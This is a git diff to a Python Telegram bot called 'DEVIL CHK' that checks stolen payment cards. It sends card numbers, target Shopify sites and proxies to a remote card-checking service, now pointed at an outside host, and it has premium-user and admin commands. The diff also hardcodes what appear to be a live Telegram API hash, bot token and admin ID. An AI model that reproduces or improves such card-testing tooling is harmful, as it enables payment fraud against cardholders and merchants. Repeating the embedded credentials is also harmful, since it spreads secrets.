@@ -13,7 +13,7 @@ API_ID = 39825025
 API_HASH = '47170fd9a11b3f591bbc56849519f0f8'
 BOT_TOKEN = '8827673793:AAHFpHDHGCwBpn2MpQf61G4N-1ebDz1bFSw'
 ADMIN_ID = [1707478010]
-CHECKER_API_URL = 'http://187.77.70.6:5000/shopify'
+CHECKER_API_URL = '‏https://haters.cxchk.site/shopii'
 
 PREMIUM_USERS_FILE = "premium_users.txt"
 SITES_FILE = 'sites.txt'
@@ -193,24 +193,23 @@ async def check_card(card, site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
 
-        # 2. إعداد البروكسي بصيغة http://ip:port
-        proxy_str = ""
+        # 2. إعداد البروكسي
+        proxy_str = None
         if proxy:
-            if not proxy.startswith('http://') and not proxy.startswith('https://'):
-                proxy_str = f"http://{proxy}"
-            else:
-                proxy_str = proxy
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) >= 2:
+                proxy_str = proxy 
 
-        # 3. إعداد البيانات للرابط الجديد بالصيغة المطلوبة تماماً
+        # 3. إعداد البيانات للرابط الجديد
         params = {
-            'cc': clean_card,
-            'site': site
+            'site': site,
+            'cc': clean_card
         }
         if proxy_str:
             params['proxy'] = proxy_str
 
         # 4. الاتصال بالموقع (استخدام الرابط الجديد)
-        url = CHECKER_API_URL
+        url = "https://haters.cxchk.site/shopii"
         timeout = aiohttp.ClientTimeout(total=100)
 
         async with aiohttp.ClientSession(timeout=timeout) as session:
@@ -391,14 +390,17 @@ async def test_site(site, proxy):
         if not site.startswith('http'):
             site = f'https://{site}'
 
-        proxy_str = ""
+        proxy_str = None
         if proxy:
-            if not proxy.startswith('http://') and not proxy.startswith('https://'):
-                proxy_str = f"http://{proxy}"
-            else:
-                proxy_str = proxy
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) == 4:
+                ip, port, user, password = proxy_parts
+                proxy_str = f"{ip}:{port}:{user}:{password}"
+            elif len(proxy_parts) == 2:
+                ip, port = proxy_parts
+                proxy_str = f"{ip}:{port}"
 
-        url = f'{CHECKER_API_URL}?cc={test_card}&site={site}'
+        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
         if proxy_str:
             url += f'&proxy={proxy_str}'
 
@@ -496,7 +498,7 @@ async def admin_panel_callback(event):
 
     admin_text = """<b>⚡💳 ㅤ#𝐃𝐄𝐕𝐈𝐋 𝐂𝐇𝐊  💳⚡</b>
 <b>━━━━━━━━━━━━━━━━━</b>
-<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞 ll</b>
+<b>⚡💠 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥</b>
 <blockquote>• /addpremium id - Add premium user
 • /removepremium id - Remove premium user
 • /listpremium - List premium users
